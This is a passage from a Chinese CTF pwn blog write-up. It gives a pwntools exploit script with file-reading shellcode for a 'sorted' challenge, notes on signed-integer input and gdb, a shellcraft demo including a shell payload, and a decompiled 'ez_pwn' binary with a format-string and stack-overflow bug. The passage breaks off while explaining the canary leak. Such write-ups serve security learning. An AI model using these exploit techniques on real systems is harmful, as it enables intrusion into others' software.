class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 设置目标架构为x86-64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 默认的是大端序，可以修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.endian = &lt;span class=&#34;string&#34;&gt;&amp;#x27;little&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./sorted&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(io)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;-1869557199 -1862532682 -1862366904 -57622479 -57606351 -53083832 -50592497 -50534657 2147483647 2147483647&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;sc_elf = ELF(&amp;#x27;b.out&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;sc = sc_elf.get_section_by_name(&amp;#x27;.shellcode&amp;#x27;).data()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;print(sc)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;hflagH\x89\xe71\xd21\xf6j\x02X\x0f\x05\x89\xc71\xc0j ZH\x89\xe6\x0f\x05j\x01_j ZH\x89\xe6j\x01X\x0f\x05\xcc&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = shellcraft.&lt;span class=&#34;built_in&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./flag&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode += shellcraft.read(&lt;span class=&#34;string&#34;&gt;&amp;quot;rax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode += shellcraft.write(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;rsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.send(flat(&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;: asm(shellcode),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;: [],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;









&lt;h3 id=&#34;各种疑惑&#34;&gt;&lt;a href=&#34;#各种疑惑&#34; class=&#34;headerlink&#34; title=&#34;各种疑惑&#34;&gt;&lt;/a&gt;各种疑惑&lt;/h3&gt;&lt;p&gt;问: 为什么-490631024 读入内存会成为 0xe2c19090&lt;/p&gt;
&lt;p&gt;答: 负数会采用补码来存储&lt;/p&gt;
&lt;p&gt;问: 为什么前期用python得到的数 输入进去奇奇怪怪&lt;/p&gt;
&lt;p&gt;答:0xfcffffff scanf %d 读取的时候，会解释为负数，所以 不能用python里的直接数值转换来得到题目要输入的值（怪不得前期一直不对。。）&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;value = &lt;span class=&#34;number&#34;&gt;0xfcffffff&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xfcffffff&lt;/span&gt; &amp;lt; &lt;span class=&#34;number&#34;&gt;0x80000000&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xfcffffff&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x100000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这样就对了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;或者&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; struct&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = struct.pack(&lt;span class=&#34;string&#34;&gt;&amp;quot;I&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0xfcffffff&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 将无符号整数打包为二进制数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;value = struct.unpack(&lt;span class=&#34;string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt;, data)[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;# 将二进制数据解析为有符号整数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(value)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;怎么比较好的在gdb中查看shellcode的汇编呢&lt;/p&gt;
&lt;p&gt;display &amp;#x2F;20i $pc&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/counsellor/article/details/100034080&#34;&gt;https://blog.csdn.net/counsellor/article/details/100034080&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/&#34;&gt;https://amritabi0s.wordpress.com/2017/10/23/hack-lu-ctf-bit-writeup/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwntools的使用&#34;&gt;&lt;a href=&#34;#pwntools的使用&#34; class=&#34;headerlink&#34; title=&#34;pwntools的使用&#34;&gt;&lt;/a&gt;pwntools的使用&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 设置目标架构为x86-64&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 默认的是大端序，可以修改&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.endian = &lt;span class=&#34;string&#34;&gt;&amp;#x27;little&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = shellcraft.sh()  &lt;span class=&#34;comment&#34;&gt;# 指令字符串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcodeasm = asm(shellcraft.sh()) &lt;span class=&#34;comment&#34;&gt;# 二进制数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 使用 disasm 函数查看每一行汇编指令的十六进制值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;disassembled = disasm(shellcodeasm)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 分割每一行汇编指令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;instructions = disassembled.split(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 打印每一行指令及其十六进制值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; instruction &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; instructions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(instruction)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 打印整个shellcode的十六进制值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(shellcodeasm.&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 如何打印指定汇编指令的16进制值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assembly_code = &lt;span class=&#34;string&#34;&gt;&amp;quot;mov eax,0x123&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hex_assembly = asm(assembly_code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hex_assembly_code = asm(assembly_code).&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hex_assembly_1 = disasm(hex_assembly)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;汇编指令二进制表示: &lt;span class=&#34;subst&#34;&gt;&amp;#123;hex_assembly&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;汇编指令的十六进制表示: &lt;span class=&#34;subst&#34;&gt;&amp;#123;hex_assembly_code&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;汇编指令: &lt;span class=&#34;subst&#34;&gt;&amp;#123;hex_assembly_1&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;##  shellcraft的各种使用方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcraft.read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;pwn asm汇编器&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html&#34;&gt;https://leeyuxun.github.io/pwntools%E6%A8%A1%E5%9D%97%E6%80%BB%E7%BB%93.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/&#34;&gt;https://zero-mk.github.io/2019/01/01/pwntools-Command%20Line%20Tools/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwn &lt;span class=&#34;keyword&#34;&gt;asm&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;mov eax,0x1&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b801000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;ez-pwn&#34;&gt;&lt;a href=&#34;#ez-pwn&#34; class=&#34;headerlink&#34; title=&#34;ez_pwn&#34;&gt;&lt;/a&gt;ez_pwn&lt;/h1&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **envp)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+0h] [rbp-30h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+28h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;input your name&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush(_bss_start);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;hello: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush(_bss_start);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;leave some message&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  fflush(_bss_start);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, &lt;span class=&#34;number&#34;&gt;0x48&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​	主要是有个canary,把canary泄露出来就可以了,普通栈溢出，利用格式化字符串来泄露canary，注意前六个参数是在寄存器里的值呀。&lt;/p&gt;
&lt;p&gt;​	然后接收的时候注意先把hello：什么的接收了，&lt;/p&gt;
